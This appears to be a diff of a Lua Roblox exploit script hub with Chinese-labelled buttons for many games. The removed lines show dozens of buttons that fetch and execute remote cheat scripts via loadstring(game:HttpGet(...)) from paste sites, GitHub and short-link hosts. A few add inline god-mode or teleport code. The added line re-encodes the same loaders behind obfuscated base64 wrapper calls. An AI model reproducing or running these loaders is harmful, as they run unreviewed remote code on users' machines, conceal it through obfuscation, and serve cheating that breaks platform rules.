-    loadstring(game:HttpGet("https://paste.gg/p/anonymous/697fc3cad5f743508318cb7399e89432/files/b5923e52edab4e5c91e46b74563d0ae8/raw"))()
-end)
-    credits:Button("战斗勇士无限体力",function()
-    loadstring(game:HttpGet("https://shz.al/~KSK"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("piggy脚本",'16060333448')
-
-local credits = creds:section("piggy脚本",true)
-    credits:Button("piggy脚本",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Piggy/Loader.lua"))()
-end)
-    credits:Button("piggy英文",function()
-    loadstring(game:HttpGet("https://encurtador.com.br/fiyFJ"))()
-end)
-
-local creds = window:Tab("SharkBite 2[TRADING]脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("SharkBite 2[TRADING]",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/JerrymiahPM/SharkRipper/main/main.lua"))()
-end)
-    credits:Button("SharkBite 2[TRADING]",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/PikachuHack/SharkBite2-Instant-Kill-Main-Shark/main/Instant%20Kill%20Main%20Shark"))()
-end)
-local credits = creds:section("『卡密模式』",true)
-    credits:Button("SharkBite 2[TRADING]",function()
-    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/62ac508ae22ac9d4d5485af7a4531b0b.lua"))() 
-end)
-    credits:Button("点击我复制密钥链接",function()
-    setclipboard("https://keyrblx.com/getkey/StellarHub")
-end)
-    credits:Button("SharkBite 2[TRADING]",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/FlmesCoding/CandyHubGames/main/Protected_1799613766569471.lua"))()
-end)
-    credits:Button("点击复制dc",function()
-    setclipboard("https://discord.gg/NZU9zq5gMu")
-end)
-    credits:Button("SharkBite 2[TRADING]",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/IsThisMe01/Project-L/main/Main.lua"))()
-end)
-    credits:Button("点击我复制dc",function()
-    setclipboard("https://discord.gg/FWhdk92nYj")
-end)
-
-local creds = window:Tab("火箭发射模拟器",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("火箭发射模拟器（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("https://ayangwp.cn/api/v3/file/get/9245/%E7%8C%AB%E9%80%9A%E7%94%A8.txt?sign=hrWROZdVfK2mtJcIFa3Tvbl-TojP1C86_Zd3q03qttc%3D%3A0"))()
-end)
-    credits:Button("火箭发射模拟器（名字相同脚本不同）",function()
-    loadstring(game:HttpGet(('https://raw.githubusercontent.com/dizyhvh/rbx_scripts/main/321_blast_off_simulator')))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("只因剑",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("只因剑（名字相同脚本不同）",function()
-    loadstring(game:HttpGet(('https://gist.githubusercontent.com/blox-hub-roblox/021bad62bbc6a0adc4ba4e625f9ad7df/raw/c89af6e1acf587d09e4ce4bc7510e7100e0c0065/swordWarrior.lua'),true))()
-end)
-    credits:Button("只因剑（2召唤小黑子）",function()
-    loadstring(game:HttpGet(('https://gist.githubusercontent.com/blox-hub-roblox/021bad62bbc6a0adc4ba4e625f9ad7df/raw/c89af6e1acf587d09e4ce4bc7510e7100e0c0065/swordWarrior.lua'),true))()
-end)
-    credits:Button("只因剑（3巨剑战士）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe/ToraIsMe/main/0SwordWarriors"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("战争大亨脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("战争大亨",function()
-    loadstring(game:HttpGet'https://raw.githubusercontent.com/Macintosh1983/ChillHubMain/main/ChillHubOilWarfareTycoon.lua')()
-end)
-    credits:Button("狼脚本",function()
-    loadstring(game:HttpGet("https://shz.al/~WarTycoon"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("彩虹朋友",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("彩虹朋友（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("https://pastefy.app/XoNv04vR/raw"))()
-end)
-    credits:Button("彩虹朋友自动获胜",function()
-    loadstring(game:HttpGet("https://shz.al/~zkzkzisKAKAKKKKSS"))()
-end)
-    credits:Button("彩虹朋友（推荐）",function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/BorkWare/main/Scripts/' .. game.GameId .. ".lua"))(' Watermelon ? ')
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("河北唐县",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("河北唐县（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Sw1ndlerScripts/RobloxScripts/main/Tang%20Country.lua"))()
-end)
-    credits:Button("河北唐县（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("https://pastefy.app/s20nni0h/raw"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("Blox Fruit",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("霖溺BF",function()
-    loadstring(game:HttpGet("https://shz.al/~KAKKKS"))()
-end)
-    credits:Button("BF『HOHO脚本』链接不一样",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HohoV2/Free/BloxFruitFreeV3.lua"))()
-end)
-    credits:Button("BF『HOHIO脚本』链接不一样",function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
-end)
-    credits:Button("BF（听说第二强）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Augustzyzx/UraniumMobile/main/UraniumKak.lua"))()
-end)
-    credits:Button("BF（霖溺找的）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxScriptsExploit/Blox-Fruits/main/Ripper%20M"))()
-end)
-    credits:Button("BF（自动箱子）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
-end)
-    credits:Button("BF（汉化）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/Xiao-Yun-UWU/main/%E6%B5%B7%E8%B4%BC%E7%8E%8Bbf.lua", true))()
-end)
-    credits:Button("BF（听说最屌）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/AkiraNus/UniquehubKak/main/FreeCr.Xenonhub"))()
-end)
-    credits:Button("BF（刷怪）",function()
-    loadstring(game:HttpGet('https://rawscripts.net/raw/UPDATE-16-Blox-Fruits-Nub-V1-Hub-4583'))()
-end)
-    credits:Button("BF脚本w-azure无密钥",function()
-    getgenv().Team = "Pirates"loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
-end)
-    credits:Button("BF（自动升级）",function()
-    loadstring(game:HttpGet"https://raw.githubusercontent.com/xDepressionx/Free-Script/main/AllScript.lua")()
-end)
-    credits:Button("BF",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("进击的僵尸脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("进击的僵尸",function()
-    loadstring(game:HttpGet("https://shz.al/~KSKSKSK"))()
-end)
-
-local creds = window:Tab("破坏者谜团2",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("破坏者谜团2（多功能）",function()
-    loadstring(game:HttpGet(("https://raw.githubusercontent.com/Ethanoj1/EclipseMM2/master/Script"),true))()
-end)
-    credits:Button("霖溺非常推荐（破坏者谜团2）",function()
-    loadstring(game:HttpGet("https://shz.al/~GHD"))()
-end)
-    credits:Button("破坏者谜团2（老外的）",function()
-    loadstring(game:HttpGet("https://shz.al/~GHDJJ"))()
-end)
-    credits:Button("破坏者谜团2",function()
-    loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
-end)
-    credits:Button("破坏者谜团（透视谁是警长）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/Releases/main/MurderMystery2HighlightESP"))(' Watermelon ?')
-end)
-
-local creds = window:Tab("nico下一个机器人脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("nico下一个机器人",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/elonof/nicosbots-script/main/main.lua",true))()
-end)
-    credits:Button("nico下一个机器人",function()
-    loadstring(game:HttpGet("https://fern.wtf/scripts/nico_bot.lua", true))()
-end)
-    credits:Button("nico下一个机器人",function()
-    local hrp = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
-hrp.Parent = nil
-hrp:Clone()
-hrp.Parent = game.Players.LocalPlayer.Character
-hrp.Name = "Humanoid"
-game.StarterGui:SetCore("SendNotification", {Title="God Mode"; Text="God Mode Activated"; Duration=5;})
-end)
-    credits:Button("nico下一个机器人",function()
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/fartbutt69/Nico-s-Nextbot-Killer/main/script.lua", true))()
-end)
-    credits:Button("nico下一个机器人",function()
-    local Player = game:GetService("Players").LocalPlayer
-
-while true do 
-wait(0.5)
-Player.Character.HumanoidRootPart.Position = Vector3.new(0, -50, 0)
-wait(0.5)
-Player.Character.HumanoidRootPart.Position = Vector3.new(0, -80, 0)
-end
-end)
-
-local creds = window:Tab("蜂群模拟器",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("霖溺简易汉化",function()
-    loadstring(game:HttpGet("https://shz.al/~HHAKKJA"))()
-end)
-    credits:Button("蜂群模拟器",function()
-    loadstring(game:HttpGet("https://shz.al/~HHAKKSS"))()
-end)
-    credits:Button("蜂群模拟器（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/3A61hnGA", true))()
-end)
-    credits:Button("蜂群模拟器bee swarm",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Historia00012/HISTORIAHUB/main/BSS%20FREE"))()
-end)
-    credits:Button("蜂群模拟器（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("https://pastefy.app/QtYmKaQ1/raw"))()
-end)
-    credits:Button("蜂群模拟器（自动收集）",function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/max0mind/lua/main/loader.lua'))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uBICpKyVlQlyDGTUBMDqJoDRmteFVtXXIVQUsOkBTnjKefEXaQWAsHjKkCfeGGXsEWwAMFVGlhbmhl')s script hubtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('oAoirupZPmiYnMxaBUdMtZddBnUNEewkuExNeznTHOxvskNKGRaSgzlRjuRZzimYOSyLHcLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastebin.com/raw/xdQVhQdmtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hAABCRbHbbvCJUXONGBgrscAOvBXKdGHCdJgrftrFGTEwZMpdRHVrwzhBsTXwbvwFgkDRpKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')Mango hubtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('pXqaOsGhsguLYhCNybuFiwSjMNobEkfCrCeTrqVFBLzQonkOGAYMmnqymAgHHfkosuIzsTLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://gitlab.com/L1ZOT/mango-hub/-/raw/main/Mango-Bloxf-Fruits-BetatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ovEyGcnnEZxeRDLcjRUjAYivgXpEChIMPmmarIxLyIXeEulwHEhHhpyEBKFFsBXmWmcTaqKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')SOG hubtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('EfPkVZNokfajFrheKMBSKtsJuvpLMunGQkptGspfqvHSVmKXoUltsctPuYKSIWogPVgiBWLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~JAJSNN233tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('irdQttjYbYzjVMKOxGmuIgIRTWXsLXlMEpKqBsMiamvXmtfsQriBPxhgFrRDrXJLPiCKftKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')VG hubtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cEYkQcrbbLxtfcmbaiqDYHwHRfRUQgiaCjCJyeIYkwdpLtTGYcduYfbRceeLHqtKKRqtdRLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.GhubtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kJfTveBetFLpzwLAiaRcsLobDBgPFZfnLWoFcPMrNnJxUyRvOsDoZRPGFDvCalGrgyWRkmKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')Owl-Hub『嘿嘿』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GmAvOScNqoTOZOZMuAYnnyPIVrgvmtYtoSCTqKGNkjgeBLTOIYifpfNAbBPjEFOmhxJKkVLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txttZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hvVAsOnViCHvDDGGPQOPYVdzJAHSCLqcqApqbYCkuJstVtSvJUkKIQZGWxfQbPVJFOGQCQKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')HOHO_hubtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kbmgxUqvnHylVYusuEVCYWSTiLuBkJCHYFUiZmjUxniZXEjyXVMcKixahETwupPCtfFiXfLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UItZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('eSNaDkKymckxXXGUUbtCSdjAZNHZNdbRtLwQtzhHTEOsjFEfWnFqxvShhucATTVNrknhBXKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')FE脚本『这几天将全部添加』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vzjANYhJnFVorbwvlMzjRoUfwqfKbWLyYPkxHkKLCSJbjGFCiresJJEZtJKqpaYhunhPuaLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('zhDdeNVOWTnBaWeuTkBAqLaqDtzxjcCIMhYKSlUmwCbCqPOcaiFMFMpgNmfrVRFOtputNcKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('aTSnkWXrFitFjOAAAKQidOZIrOeJqAwoalWjemqpdAjhtRhTzkDrUkwTQeDsYRkpEEutkbLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')C00lguitZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SmEHasLVJDLZHhlJnpkUXWFBeKVqCXVVYEJWARDEUeRmyWAwUaUvDEAxHziNlTKLgeqnkGLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6R2V0T2JqZWN0cyg=')rbxassetid://8127297852tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DjubHtgESCkxIYgBVtQWHiaqINctjrxqGFvnSVshpoRBtkpdcOrAApAjYPvLPgFiCgFqEZKVsxXS5Tb3VyY2UpKCkNCmVuZCkNCiAgICBjcmVkaXRzOkJ1dHRvbig=')1x1x1x1tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LRnPoBYjoRCbnSEvKDGKGQwPzgpammvTYpuREAqztVfvDVKqUafkGNjQJHtdgegvbIUVYuLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgo')https://pastebin.com/raw/JipYNChttZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ESoDbqsrTtbDUnNitMTOkxlzryMgeRqOWIPNziUJzgsvGsnzTjMCGRVkurJvairXooxuuUKSx0cnVlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')Abyssal swordtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('oSCaeKfocBxKCtnDbJxazUryYeeFQoqflaukMXKapyZiGdJAjFDBKOidiJiMxfcafSiaNrLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KHHGtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('eVjZDrlOwMtBMTMCRMlYWbuDQghgtDZbzyKBcLBmkCUPBHpxGFKpIaCteoZSeeViIXSAOXKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')FE传送tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qXHNzlrZTlnwrpjkGfCqYNDZPbbutOZdGIQekvURIYYZumaHANXoLNIYBVTwmDtxYhLeLTLGZ1bmN0aW9uKCkNCiAgICBtb3VzZSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcjpHZXRNb3VzZSgpIHRvb2wgPSBJbnN0YW5jZS5uZXco')TooltZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sHIcgIKgrzqBDsRlmkXutwEEajhmdtblHXTfQjUQDebvvUOJXfsKYESARWizFhpvhHIcvCKSB0b29sLlJlcXVpcmVzSGFuZGxlID0gZmFsc2UgdG9vbC5OYW1lID0g')[FE] TELEPORT TOOLtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('bUJvORYBtcfGqHsDnABIvZvEHDRidqBAbgRWixhvNcQYmHJGlYzQZbKqRmaMyYkofILswPIHRvb2wuQWN0aXZhdGVkOmNvbm5lY3QoZnVuY3Rpb24oKSBsb2NhbCBwb3MgPSBtb3VzZS5IaXQrVmVjdG9yMy5uZXcoMCwyLjUsMCkgcG9zID0gQ0ZyYW1lLm5ldyhwb3MuWCxwb3MuWSxwb3MuWikgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IHBvcyBlbmQpIHRvb2wuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrDQplbmQpDQogICAgY3JlZGl0czpCdXR0b24o')AKVtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mwZXayEnPQqZrWIATFPibjwNSbXOaGpYYYepXJXNBESWHQLWjNpTbkisVNcbXicmMBhqVpLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KHHGKtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KwWsVDvsrDnZBhYMqpcWWRxMCWnGBelCbRbQCChQjKHqtziGKTfjppRaBBqdwmyppkMjmgKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')AK47tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('oXrKwFFFbKyPaKKdGedLxpEbOsKwQtRNRdkRpcymHGPEEWUEcrzahLXksFHfFHTaZjZTaoLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KHHGKKtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QXnYOEaffHXxLXjqggkgylFjaUIEqQQXgRSmswqVICfHJiCBGPMNpVPSQVIBJyfHRzafVHKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')AbyssEyetZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KcroEBxMtItZppocbjFfRiSYETnyJKoqsunqeGZpGTscUWtPvkXOnlRfuIwWBABoHSVtuHLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KHJJtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XLhDXWlMdeYTQzYQExylDPiEDSdVEWlpUvjKUueCRoNKaMdknSLluGdiEebqsewImWHKoKKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')Animation ID PlayertZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xbzYkKEvOrhszWdxgwTecEPGFLixhslyGlZNjqcybxkRMfqObImWlZqAUqKwCCAViClVqrLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KHJJKtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZaQyiWaLAhmzNGwCRmjUioMhjQlrXsKBdhKEoINrpCXFIDopluauyvHLfpAoOXIeWETIFtKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')Angel wing mastertZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('pFTAoFKNVqdepRQfjincGYVTiCPEfmIZwIOqwARWBmEvUBjTaWbtgETNtvXNmmkxHsJSjyLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~HHAtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('aVUnlwmpepvvDsJGmXjFjBxccxsJeJibzrXIzDNhfcxoOglROYCQsxHwTjzYPWyBLqbCmYKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')Amythest SwordtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wRPlUUOhnOlbELVItqwVirCwLQlTCNzmTnmMnsrfugEklkxoxKYQlsaUSLUqbtIeFAdGiTLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~HHAJtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VpwhFYISiCUbsrlpNWVjdpdbCdnIOqCYUBXuQswWznAbFTrYejJTDsQWfbLJwzwMoZynpxKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')Amythest NinjatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('gmesrJeJHuKSosYEkuYkqueHurIPlGcDGluyKmRTLuQwjVnLOaeVQIFzYbgaxjJKOUBJnzLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~HHAJKtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('zRGkdacmORgwkFeCPcKvlxMjbUfpRLGufOcZXMnjUFrilZhwXjdODeizJttTMxyyrCUgdBKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')Baldi 